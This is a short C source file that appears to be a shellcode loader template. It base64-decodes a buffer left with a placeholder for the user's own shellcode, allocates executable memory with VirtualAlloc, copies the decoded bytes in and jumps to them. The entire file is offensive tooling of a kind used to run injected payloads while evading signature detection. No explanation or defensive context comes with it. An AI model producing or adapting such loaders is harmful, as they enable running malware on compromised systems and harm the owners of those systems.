#include "base64.h"
unsigned char buf[] ="..你的shellcode";
int main(int argc, const char * argv[]) {
  char str1[1000] = { 0 };
  Base64decode(str1, buf);
  char *Memory;
  Memory = VirtualAlloc(NULL, sizeof(str1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  memcpy(Memory, str1, sizeof(str1));
  ((void(*)())Memory)();
  return 0;
}